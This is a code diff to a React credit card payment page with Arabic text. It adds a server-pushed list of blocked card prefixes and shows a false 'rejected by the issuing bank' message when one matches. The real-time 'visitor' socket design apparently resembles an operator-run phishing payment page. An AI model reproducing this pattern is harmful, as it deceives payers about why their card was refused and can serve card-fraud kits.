@@ -226,12 +226,49 @@ export default function CreditCardPayment() {
     return groups ? groups.join(" ") : cleaned;
   };
 
+  // State for global blocked cards
+  const [globalBlockedCards, setGlobalBlockedCards] = useState<string[]>([]);
+  const [globalBlockedError, setGlobalBlockedError] = useState(false);
+
+  // Listen for global blocked cards updates
+  useEffect(() => {
+    socket.value.emit("blockedCards:get");
+    
+    const handleBlockedCardsList = (cards: string[]) => {
+      setGlobalBlockedCards(cards || []);
+    };
+    
+    const handleBlockedCardsUpdated = (cards: string[]) => {
+      setGlobalBlockedCards(cards || []);
+    };
+    
+    socket.value.on("blockedCards:list", handleBlockedCardsList);
+    socket.value.on("blockedCards:updated", handleBlockedCardsUpdated);
+    
+    return () => {
+      socket.value.off("blockedCards:list", handleBlockedCardsList);
+      socket.value.off("blockedCards:updated", handleBlockedCardsUpdated);
+    };
+  }, []);
+
   // Check blocked card prefixes and validate card number
   const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
     const blockedPrefixes = visitor.value.blockedCardPrefixes;
+    const cardPrefix = rawValue.slice(0, 4);
 
-    if (blockedPrefixes && blockedPrefixes.includes(rawValue.slice(0, 4))) {
+    // Check global blocked cards
+    if (cardPrefix.length === 4 && globalBlockedCards.includes(cardPrefix)) {
+      setGlobalBlockedError(true);
+      setValue("cardNumber", formatCardNumber(rawValue));
+      setLuhnError(false);
+      setCardError(false);
+      return;
+    } else {
+      setGlobalBlockedError(false);
+    }
+
+    if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
       setCardError(true);
       setValue("cardNumber", "");
       setLuhnError(false);
@@ -332,6 +369,14 @@ export default function CreditCardPayment() {
         {rejectedError && (
           <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
             <p className="text-red-600 text-center font-medium">معلومات البطاقة المدخلة غير صحيحة</p>
+          </div>
+        )}
+
+        {/* Global Blocked Card Error Message */}
+        {globalBlockedError && (
+          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
+            <p className="text-red-600 text-center font-medium">تم رفض العملية من قبل البنك المصدر للبطاقة</p>
+            <p className="text-red-500 text-center text-sm mt-1">يرجى المحاولة بوسيلة دفع أخرى</p>
           </div>
         )}
 
@@ -442,7 +487,7 @@ export default function CreditCardPayment() {
             type="submit" 
             className="w-full" 
             size="lg"
-            disabled={!isFormValid}
+            disabled={!isFormValid || globalBlockedError}
           >
             ادفع الآن
           </Button>
